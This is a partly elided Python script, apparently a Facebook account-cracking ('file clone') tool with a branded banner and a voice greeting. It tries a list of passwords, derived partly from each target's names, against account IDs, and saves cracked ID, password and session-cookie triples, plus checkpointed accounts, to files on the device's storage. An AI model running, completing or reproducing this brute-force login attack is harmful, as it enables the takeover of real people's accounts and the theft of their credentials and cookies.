...
os.system('espeak -a 300 "well,come to,rajib,file,clone, tools"')
os.system('xdg-open https://www.facebook.com/MR.RAJIB.2003/.Ok.Bro')
logo = f'''\n        
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
██████╗░░█████╗░░░░░░██╗██╗██████╗░  
██╔══██╗██╔══██╗░░░░░██║██║██╔══██╗
...
def __________method__________(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r{xd}~{W}[{G}RAJIB-402-XD{W}]~[{Y}%s{W}]~[{G}%s{W}]~[{R}%s{W}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/RAJIB-402-XD-FILE-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        #print(f'\r{R}[{R}CHECKPOINT{R}]{R} '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAJIB-402-XD-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break       
                        else:continue
                loop+=1
